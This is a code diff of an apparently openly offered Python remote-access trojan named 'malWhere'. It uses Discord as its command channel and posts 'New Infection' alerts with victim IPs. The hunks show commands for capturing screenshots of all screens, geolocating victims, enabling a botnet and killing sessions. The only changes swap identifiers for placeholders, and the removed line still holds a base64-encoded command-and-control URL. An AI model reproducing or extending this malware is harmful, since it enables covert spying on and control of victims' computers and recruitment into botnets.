@@ -21,7 +21,7 @@ from datetime import datetime
 import shutil
 import string
 
-encryptedapi="aHR0cHM6Ly9nb2RzZXllLmZyZWUuYmVlY2VwdG9yLmNvbS8="
+encryptedapi="<encrypted api url>"
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
 sample_string_bytes = base64.b64decode(base64_bytes)
@@ -55,9 +55,9 @@ malWhere.remove_command('help')
 
 @malWhere.event
 async def on_ready():
-  guild = malWhere.get_guild(874824520467349504)
+  guild = malWhere.get_guild(<guild id>)
   try:
-    infectionschannel=malWhere.get_channel(874824520693874756)
+    infectionschannel=malWhere.get_channel(<infections channel_id)
     existing_channel = discord.utils.get(guild.channels, name=ip4chan)
     if not existing_channel:
       embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
@@ -117,7 +117,7 @@ async def geolocate(ctx):
 async def screenshot(ctx):
   try:
     if str(ctx.channel)==(ip4chan):
-      guild = malWhere.get_guild(874824520467349504)
+      guild = malWhere.get_guild(<guild_id again)
       ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
       existing_channel = discord.utils.get(ctx.guild.channels, name=f"{ip4chan}-media")
       if not existing_channel:
@@ -183,7 +183,7 @@ async def rickroll(ctx):
 async def botnet(ctx,status):
   try:
     if str(ctx.channel)==(ip4chan):
-      botnet_channel=malWhere.get_channel(931748491078811698)
+      botnet_channel=malWhere.get_channel(botnet channel_id)
       global botnet_flag
       if status=="enable":
         if botnet_flag:
@@ -268,7 +268,7 @@ async def kill(ctx):
   try:
     if str(ctx.channel)==(ip4chan):
       global botnet_flag
-      botnet_channel=malWhere.get_channel(931748491078811698)
+      botnet_channel=malWhere.get_channel(<botnet channel_id>)
       if botnet_flag==False:
         pass
       else:
